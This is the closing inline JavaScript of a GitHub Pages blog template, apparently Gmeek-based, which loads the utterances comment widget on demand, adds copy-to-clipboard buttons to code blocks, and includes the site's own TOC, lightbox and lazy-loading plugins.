document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.disabled=true;
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
    script.setAttribute("issue-term","title");
    
    script.setAttribute("theme","github-light");
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>
</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>

</html>
